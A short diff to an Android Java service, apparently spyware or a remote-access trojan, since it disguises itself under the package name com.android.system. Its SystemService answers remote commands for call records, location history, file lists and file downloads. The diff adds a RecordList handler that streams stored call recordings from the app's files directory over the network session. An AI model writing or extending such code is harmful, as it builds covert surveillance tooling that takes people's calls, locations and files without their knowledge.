@@ -17,6 +17,7 @@ import com.android.system.NetworkSessionManager;
 import com.android.system.db.LocationDb;
 import com.android.system.function.FileDownload;
 import com.android.system.function.FileList;
+import com.android.system.function.RecordList;
 import com.android.system.utils.DataPack;
 import com.android.system.utils.LocationUtil;
 import com.android.system.utils.SystemUtil;
@@ -164,7 +165,7 @@ public class SystemService extends Service{
                     e.printStackTrace();
                 }
             } else if(action.equals(ACTION_CALL_RECORD)) {
-
+                new RecordList(SystemService.this.getFilesDir().getAbsolutePath()).handle(inputStream,outputStream);
             } else if(action.equals(ACTION_LOCATION_LIST)) {
                 List<LocationDb.LocationInfo> infoList = LocationDb.list();
                 JSONObject responseJsonObject = new JSONObject();
